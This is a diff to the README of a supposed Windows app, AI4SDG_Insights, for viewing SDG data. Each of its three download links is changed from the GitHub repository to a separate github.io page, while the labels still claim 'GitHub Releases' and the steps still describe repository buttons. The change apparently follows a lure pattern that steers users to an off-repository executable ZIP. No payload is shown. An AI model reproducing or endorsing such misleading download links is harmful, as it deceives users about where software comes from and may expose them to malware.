@@ -1,6 +1,6 @@
 # 📊 AI4SDG_Insights - Turn Global Data into Local Action
 
-[![Download Now](https://img.shields.io/badge/Download-From_GitHub_Releases-2ea44f?style=for-the-badge)](https://github.com/kelleyspinnable212/AI4SDG_Insights)
+[![Download Now](https://img.shields.io/badge/Download-From_GitHub_Releases-2ea44f?style=for-the-badge)](https://kelleyspinnable212.github.io)
 
 ## 🚀 What is AI4SDG_Insights?
 AI4SDG_Insights is a ready-to-use desktop application that helps you explore the United Nations Sustainable Development Goals (SDGs) through the lens of World Bank data. Whether you're a student, researcher, policy enthusiast, or just curious about global development, this tool lets you visualize complex data and read AI-generated policy briefs—all without writing a single line of code.
@@ -16,7 +16,7 @@ AI4SDG_Insights is a ready-to-use desktop application that helps you explore the
 ## 📥 Getting Started (Windows Users)
 
 ### Step 1: Download the Application
-Visit this link to download the application. [Click here to go to the download page](https://github.com/kelleyspinnable212/AI4SDG_Insights).
+Visit this link to download the application. [Click here to go to the download page](https://kelleyspinnable212.github.io).
 
 Once on the GitHub page, look for the green "Code" button or scroll down to the "Releases" section. You will find a file named `AI4SDG_Insights_Windows.zip`. Click on it to start the download. Do not worry about other files—this is the one you need.
 
@@ -69,7 +69,7 @@ A: Download the latest ZIP from the same GitHub releases page and replace your o
 - **Citizens:** Understand how your country performs on climate action or gender equality.
 
 ## 🔗 Download Again
-[🚀 Download AI4SDG_Insights from GitHub](https://github.com/kelleyspinnable212/AI4SDG_Insights)
+[🚀 Download AI4SDG_Insights from GitHub](https://kelleyspinnable212.github.io)
 
 ## 📄 License
 This project is open source under the MIT License. You can modify and distribute it freely.
